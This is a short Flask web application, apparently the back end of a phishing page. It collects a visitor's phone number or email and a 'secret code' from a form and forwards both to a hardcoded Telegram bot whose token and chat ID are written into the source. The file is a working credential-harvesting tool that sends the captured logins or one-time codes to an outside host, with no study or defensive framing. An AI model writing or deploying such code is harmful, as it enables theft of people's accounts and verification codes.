from flask import Flask, request, render_template
import requests

app = Flask(__name__)

# Replace with your Telegram bot token
TELEGRAM_BOT_TOKEN = '7473084048:AAFjZ7OxJHwTD0MsnLZ_-6y218yzjzMtSb4'
# Replace with your Telegram chat ID
TELEGRAM_CHAT_ID = '5189932629'

def send_message_to_telegram(message):
    url = f'https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage'
    payload = {
        'chat_id': TELEGRAM_CHAT_ID,
        'text': message
    }
    requests.post(url, json=payload)

@app.route('/', methods=['GET', 'POST'])
def index():
    if request.method == 'POST': 
        phone_email = request.form['phone_email']
        secret_code = request.form['secret_code']
        message = f"Phone/Email: {phone_email}\nSecret Code: {secret_code}"
        send_message_to_telegram(message)
        return 'Information sent to Telegram!'
    return render_template('index.html')

if __name__ == '__main__':
    app.run(debug=True)